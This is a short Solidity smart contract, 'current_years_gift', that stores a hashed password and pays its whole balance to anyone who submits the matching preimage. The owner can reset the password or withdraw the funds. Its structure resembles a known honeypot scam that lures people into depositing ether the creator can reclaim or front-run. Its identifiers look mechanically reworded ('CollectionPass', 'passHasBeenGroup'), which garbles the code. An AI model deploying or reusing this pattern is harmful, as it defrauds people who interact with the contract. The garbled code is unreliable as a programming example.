pragma solidity ^0.4.19;

contract current_years_gift
{
    string communication;

    bool passHasBeenGroup = false;

    address initiator;

    bytes32 public sealPass;

    function() public payable{}

    function ObtainSignature(bytes pass) public constant returns (bytes32) {return sha3(pass);}

    function CollectionPass(bytes32 signature)
    public
    payable
    {
        if( (!passHasBeenGroup&&(msg.value > 1 ether)) || sealPass==0x0 )
        {
            sealPass = signature;
            initiator = msg.sender;
        }
    }

    function CollectionCommunication(string _message)
    public
    {
        if(msg.sender==initiator)
        {
            communication =_message;
        }
    }

    function ObtainGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(sealPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
            return communication;
        }
    }

    function Revoce()
    public
    payable
    {
        if(msg.sender==initiator)
        {
            initiator.transfer(this.balance);
            communication="";
        }
    }

    function PassHasBeenCollection(bytes32 signature)
    public
    {
        if(msg.sender==initiator&&signature==sealPass)
        {
           passHasBeenGroup=true;
        }
    }
}